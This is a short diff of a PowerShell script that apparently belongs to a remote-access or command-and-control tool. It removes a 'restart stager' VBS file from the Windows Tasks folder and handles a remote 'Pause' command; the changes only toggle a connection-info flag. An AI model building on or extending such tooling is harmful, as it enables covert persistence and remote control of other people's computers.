@@ -17,6 +17,7 @@ $InfoOnConnect = 1
 
 # remove restart stager (if present)
 if(Test-Path "C:\Windows\Tasks\service.vbs"){
+    $InfoOnConnect = 0
     rm -path "C:\Windows\Tasks\service.vbs" -Force
 }
 
@@ -1339,7 +1340,8 @@ while($true){
             }
             if ($response -like "Pause") {
                 $script:authenticated = 0
-                $previouscmd = $response        
+                $previouscmd = $response
+		$InfoOnConnect = 0
                 sendMsg -Message ":pause_button: ``Session Paused..`` :pause_button:"
                 WaitingMsg
             }
